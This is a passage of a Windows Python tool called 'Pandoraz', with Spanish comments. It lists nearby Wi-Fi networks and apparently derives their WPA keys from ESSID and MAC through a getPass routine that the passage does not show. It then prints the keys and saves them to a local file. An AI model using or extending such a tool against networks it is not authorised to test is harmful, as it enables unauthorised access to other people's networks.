				X = X.strip()
				if len(X) == 4: color("AGM"), print("{}".format(X[:-1]), end=""), color("AGMC"), print("%", end="    ")
				elif len(X) == 3: color("AGM"), print(" {}".format(X[:-1]), end=""), color("AGMC"), print("%", end="    ")
				elif len(X) == 2: color("AGM"), print("  {}".format(X[:-1]), end=""), color("AGMC"), print("%", end="    ")
			
			elif Cont == 3:
				X = X.strip()
				if len(X) == 1: color("AM"), print("  {}".format(X), end="    ")
				elif len(X) == 2: color("AM"), print(" {}".format(X), end="    ")
				else: print(" ")
			elif Cont == 4:
				
				Pass = getPass(Name, X)
				Pwd[Name] = Pass
				
				MAC = X.split(":")
				for byte in MAC:
					Con+=1; color("VC"), print(byte, end=""),
					if len(MAC) == Con: color("V"), print("  ", end=""); Con = 0
					else: color("V"), print(":", end="")
				
				#~ color("V"), print("{}   ".format(X), end="")
				color("AGMC"), print("{}".format(Pass))
				
				Cont = 0
			
	else: print("\n\n\t ", end=""), Mark("!"), color("RC"), print(" Sin Contraseñas Conseguidas... Por Ahora...")



def SavePass():
	
	global Redes, Pwd
	
	Nombres = []
	
	open("📶 Pass.ZioN","a")
	Eny = open("📶 Pass.ZioN","r+")
	
	Lineas = Eny.readlines()
	
	if Lineas == []: Eny.write("\n [+] Por: LawlietJH - Pandoraz "+Version+"\n")
	
	for x in Lineas:
		
		x = x.split("\n")[0]
		
		if "ESSID: " in x:
			
			x = x.split(": ")[1]
			Nombres.append(x)
	
	Cont = 0
	Cony = 0
	Nomb = ""
	Cad1 = ""
	Cad2 = ""
	x = ""
	
	for xD in Redes:
		
		Cont += 1
		
		if Cont == 1:
			
			Nomb = xD
			
			Cad1 = "\n\t=======================================\n\t   ESSID: " + Nomb +\
				   "\n\t*WPA Key: " + Pwd[Nomb]
			
			Cony += 1
			
		elif Cont == 3:
			
			x = "\n\t   Canal: " + xD
			
		elif Cont == 4:
			
			Cad2 = "\n\t   BSSID: " + xD + x + "\n\t======================================="
			Cont = 0
			
			if not Nomb in Nombres:
				
				dt = datetime.datetime.now()
				FH = dt.strftime("\n\n\n\t%A %d de %B del %Y - %H:%M").title()
				
				Eny.write(FH+Cad1+Cad2)



def Atajos():
	
	global RxD, Eny
	
	xDD = False
	Lista = ["Ctrl+P - Pausar Escaneo.","Ctrl+C - Volver/Salir."]
	Z = 0		# Por si Falla la Comparación de Tiempos.
	Cont = 0
	
	dt = datetime.datetime.now()
	dt = int(dt.strftime("%S")) + 1			# Se Obtienen los Segundos Actuales del Reloj + 1 Segundo.
	
	while True:
		
		try:
			Imp()	# Limpia El Buffer.
			
			if keyboard.is_pressed('Ctrl + P'):	# Si Se Preciona Las Teclas 'Ctrl+I' Se Obtiene Información.
				
				
				print("\n\n\t ", end="")
				Mark("¡"), color("PC"), print(" El Escaneo Ha Sido Pausado.\n\n\t ", end="")
				Mark("¡"), color("PC"), print(" Precione Cualquier Tecla Para Continuar...")
				os.system("Title [+] Escaneo Pausado! ")
				Pause()
				Imp()	# Limpia El Buffer.
				break
				
			elif keyboard.is_pressed('Ctrl + C'):	# Si Se Preciona Las Teclas 'Ctrl+C' Se Obtiene Información.
				
				if Cont == 0 and Eny > 1:
					
					print("\n\n\t ", end=""), Mark("!"), color("PC"), print(" Volviendo...")
					Cont += 1
					RxD = False
					break
				
				elif Cont == 0 and Eny <= 1:
					
					print("\n\n\t ", end=""), Mark("!"), color("PC"), print(" Saliendo...")
					Cont += 1
					xDD = True
					Salir(0)
					break
				
			else:
				
				Z += 1	# Aumenta en 1 en cada Ciclo.
				
				dt2 = datetime.datetime.now()
				dt2 = int(dt2.strftime("%S"))	# Se Obtienen los Segundos Actuales del Reloj.
					
				if Z >= 5000:		# Si Falla La Coincidencia De Tiempos, Esto Terminara el Ciclo en Aproximadamente un Segundo. 
					
					randy = random.choice(Lista)
					print("\n\n\n\t\t ", end=""), Mark("+"), color("VC"), print(" " + randy)
					
					Sleep(1.5)
					break
				
				elif dt2 == dt: break		# Si Ambos Tiempos Son Iguales, Significa Que Paso 1 Segundo y se Cierra El Ciclo.
								
		except:
			if xDD == True:
				Dat()
				Salir(0)




def Imp():	# Limpia El Buffer (Flush)
    
    try:
        
        import msvcrt
        
        while msvcrt.kbhit(): msvcrt.getch()
            
    except ImportError:
		
        import sys, termios
        
        termios.tcflush(sys.stdin, termios.TCIOFLUSH)




#=======================================================================



def Main():
	
	WinSize(80, 50)
	
	try:
		locale.setlocale(locale.LC_ALL, "esp")
		
		HiddenCursor()

		os.system("Title Pandoraz.exe                "+\
				"By: LawlietJH                "+Version+"    ")
	except:
		pass
	
	while True:
		
		try:
			Datos = ObtenerRedes()
			ImprimirListaWifi(Datos)
			getPassRedes()
			SavePass()
			Atajos()
			Imp()	# Limpia El Buffer.
			
		except IndexError: os.system("TimeOut /NoBreak 1 > Nul")
		except KeyboardInterrupt: pass
		
	



if __name__ == "__main__":
	
	if isWindows(): Main()
	else:
		print("\n\n\t Compatible Solo Con Windows.")
		Pause()

	
